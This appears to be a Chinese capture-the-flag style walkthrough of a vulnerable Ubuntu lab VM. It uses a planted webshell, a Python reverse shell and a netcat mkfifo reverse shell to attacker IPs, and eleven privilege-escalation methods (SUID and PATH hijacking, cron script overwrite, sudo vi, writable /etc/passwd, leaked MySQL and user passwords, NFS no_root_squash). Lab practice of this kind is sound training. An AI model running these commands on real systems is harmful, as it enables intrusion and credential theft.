	VMware双击打开，默认nat模式即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for localhost (192.168.253.193)

--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.193 -p- -A

80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
111/tcp open  rpcbind     2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

--------------------------------------------
--------------------------------------------
3、web信息收集
dirb http://192.168.253.193/ 
这样扫描扫不到 。php

dirb http://192.168.253.193/ -X .php
+ http://192.168.253.193/shell.php (CODE:200|SIZE:29) 

发现shell.php版本！
https 
中间件
框架
数据库


--------------------------------------------
--------------------------------------------
4、webshell

访问：http://192.168.253.193/shell.php
/*pass cmd as get parameter*/
传递cmd作为get参数！


http://192.168.253.193/shell.php?cmd=id
uid=1005(user6) gid=1005(user6) groups=1005(user6) /*pass cmd as get parameter*/

可以执行命令，这是留着的一句话后门！

http://192.168.253.193/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.139.131",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

nc -vlp 1234
ctrl + z
stty raw -echo
fg

获得稳定shell！

--------------------------------------------
--------------------------------------------
5、内部信息收集

-------------------
## 1）linpeas信息收集

Sudo version 1.8.21p2
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
（在crontab中，autoscript.sh的文件每5分钟以root权限运行一次）

127.0.0.1:3306   127.0.0.53:53   127.0.0.1:631


### 内核版本gcc信息
  
   Sudo version 1.8.21p2 
   CVE-2021-4034
### cron1 
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
cp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -

### 用户信息
```

mysql:x:121:131:MySQL Server,,,:/var/mysql:/bin/bash                                                                                                                                         
root:x:0:0:root:/root:/bin/bash
user1:x:1000:1000:user1,,,:/home/user1:/bin/bash
user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
user4:x:1003:1003:user4,,,:/home/user4:/bin/bash
user5:x:1004:1004:user5,,,:/home/user5:/bin/bash
user6:x:1005:1005:user6,,,:/home/user6:/bin/bash
user7:x:1006:0:user7,,,:/home/user7:/bin/bash
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash




uid=0(root) gid=0(root) groups=0(root)
uid=1000(user1) gid=1000(user1) groups=1000(user1)
uid=1001(user2) gid=1001(user2) groups=1001(user2)
uid=1002(user3) gid=1002(user3) groups=1002(user3)
uid=1003(user4) gid=1003(user4) groups=1003(user4),0(root)
uid=1004(user5) gid=1004(user5) groups=1004(user5)
uid=1005(user6) gid=1005(user6) groups=1005(user6)
uid=1006(user7) gid=0(root) groups=0(root)
uid=1007(user8) gid=1007(user8) groups=1007(user8)
```
### 密码泄露
╣ MySQL connection using default root/root ........... Yes
User    Host    authentication_string
root    localhost       *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
mysql.session   localhost       *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
mysql.sys       localhost       *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
debian-sys-maint        localhost       *79F5295E01C2A20AC666EBB18AC0FEFF5261301


### NFS
```
/home/user5/  *(rw,no_root_squash)
```





### root用户身份执行
══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/user5/script
/home/user4/abc.txt
/home/user3/shell
/home/user3/.script.sh
/root/
/var/mysql

-------------------
## 2）LinEnum信息收集

user1:x:1000:1000:user1,,,:/home/user1:/bin/bash
user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
user4:x:1003:1003:user4,,,:/home/user4:/bin/bash
user5:x:1004:1004:user5,,,:/home/user5:/bin/bash
user6:x:1005:1005:user6,,,:/home/user6:/bin/bash
user7:x:1006:0:user7,,,:/home/user7:/bin/bash
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash

Can we read/write sensitive files:
-rw-rw-r-- 1 root root 2648 Jun  5  2019 /etc/passwd   --/etc/passwd对用户是可写的
-rw-r----- 1 root shadow 2333 Jun  6  2019 /etc/shadow

SUID files: 可以使用root权限运行shell和脚本文件
-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user5/script
-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user3/shell

-------------------




--------------------------------------------
--------------------------------------------
6、提权

1）方法（一）user3
提权方法1：利用shell文件的SUID权限获取root shell

-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user3/shell

cd /home/user3/
./shell  --获得root权限


## 代码审计：

------

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setuid(0);
  setgid(0);
  system("./.script.sh");
  return 0;
}
```
------
find / -name .script.sh 2>/dev/null                  
/home/user3/.script.sh
cat /home/user3/.script.sh

-----
echo "You Can't Find Me"
bash -i

-----


## 2）方法（二）user5
-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user5/script

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setuid(0);
  setgid(0);
  system("ls");
  return 0;
}
```
user5主目录的脚本文件可以以root权限执行
使用Path变量利用方法，可以访问/etc/shadow文件：

参考方法：PATH
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/


cd /tmp
echo "cat /etc/shadow" > ls
chmod 777 ls
export PATH=/tmp:$PATH
cd /home/user5
./script



## 3）方法（三）user1

脚本文件可以使用root权限执行！！

echo "/bin/bash" > ls
chmod 777 ls
export PATH=/tmp:$PATH 
cd /home/user5
./script


## 4）方法（四）爆破shadow

echo 'echo "user1:12345" | chpasswd' > ls 
su user1 
sudo –l 
sudo su

chpasswd：批量修改用户名密码，详情参考文章
https://blog.csdn.net/qq_21816375/article/details/76377182

John爆破shadow：
root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::

john hash
12345            (root)



## 5）方法（五）user4
利用crontab获取root shell！

*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
（在crontab中，autoscript.sh的文件每5分钟以root权限运行一次）


echo 'echo "user4:12345" | chpasswd' > ls 
chmod 777 ls
export PATH=/tmp:$PATH
cd /home/user5
./script 
su user4 
cd /home/user4/Desktop
ls -la

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 6666 >/tmp/f
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 6666 >/tmp/f' > autoscript.sh

cat autoscript.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 6666 >/tmp/f

nc -vlp 6666

执行该文件：
./autoscript.sh
$ id
uid=1003(user4) gid=1003(user4) groups=1003(user4),0(root)


## 6）方法（六）user8
利用vi编辑器的SUDO权限！  

使用与上述相同的方法将所有用户的密码更改为12345，并在用户之间切换以检查更多漏洞，发现user8对vi 编辑器有sudo权限：


echo 'echo "user8:12345" | chpasswd' > ls 
chmod 777 ls
export PATH=/tmp:$PATH
cd /home/user5
./script 
su user8 
sudo -l

User user8 may run the following commands on osboxes:
    (root) NOPASSWD: /usr/bin/vi

sudo vi
按ESC+:
输入：!sh

:!sh
 id

uid=0(root) gid=0(root) groups=0(root)


## 7）方法（七）user7
利用/etc/passwd文件的可写权限

继续枚举用户，发现user7是gid为0的root组的成员！
已经从LinEnum扫描中知道/etc/passwd文件对用户是可写的！

user7可以编辑/etc/passwd文件：

echo 'echo "user7:12345" | chpasswd' > ls 
chmod 777 ls
export PATH=/tmp:$PATH
cd /home/user5
./script 
su user7

tail /etc/passwd 
su user7 
id

id
uid=1006(user7) gid=0(root) groups=0(root)

openssl passwd 12345
mPhL4na7YUg86
echo "dayu:mPhL4na7YUg86:0:0:root:/root:/bin/bash" >> /etc/passwd
cat passwd

su dayu
12345


## 8）方法（八）mysql

内网信息收集发现本地mysql开启状态！

mysql -uroot -proot   ---成功登录

show databases;
use user
show tables;
select * from user_info;

+----------+-------------+
| username | password    |
+----------+-------------+
| mysql    | mysql@12345 |
+----------+-------------+

su mysql
mysql@12345

find / -name mysql 2>/dev/null
/etc/apparmor.d/abstractions/mysql
/etc/init.d/mysql
/etc/mysql
/var/mysql

cd /etc/mysql
cat secret.cnf
This file contain sensitive information 

Root Credentials :

UserName:root
PassWord:root@12345

su root
12345


cd /var/mysql
ls -la
cat .user_informations
cat: .user_informations: Permission denied
chmod 600 .user_informations
user2:user2@12345
user3:user3@12345
user4:user4@12345
user5:user5@12345
user6:user6@12345
user7:user7@12345
user8:user8@12345



## 9）方法（九）user7-NFS（项目二十一）

no_root_squash：通过此选项，停用了此安全功能，从而允许客户端的root权限操作最终以root身份出现在导出的文件系统中（因此，在其余客户端中）

cat /etc/exports
/home/user5 *(rw,no_root_squash)

可以通过用户user5生成一个可提权的可执行文件放在目标靶机执行即可提权，挂载nfs到本地kali，生成一个提权文件！

2049端口NFS打开着：
mount -t nfs 192.168.253.197:/home/user5 /tmp/dayu

对方是64位的环境和项目二十一的32位环境不一样，但是方法逻辑一样！这边还更简单！

1. 按照kali的bash复制进挂载目录报错：
./dayu: error while loading shared libraries: libtinfo.so.6: cannot open shared object file: No such file or directory

2. 用写shell的方法

---
```
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/sh"); }
```
---
nano写入shell.c文件
gcc shell.c -o shell
chmod 4777 shell
./shell
成功提权！


## 10）方法（十）user2

user2:user2@12345

su user2
user2@12345

sudo -l
User user2 may run the following commands on osboxes:
    (user1) ALL


sudo -u user1 bash
sudo -l 
user1@12345
User user1 may run the following commands on osboxes:
    (ALL : ALL) ALL

sudo su


## 11）方法（十一）user4 GID

su user4
user4@12345


cat /etc/group 
root:x:0:user4,user7

和方法六一样写passwd即可！
































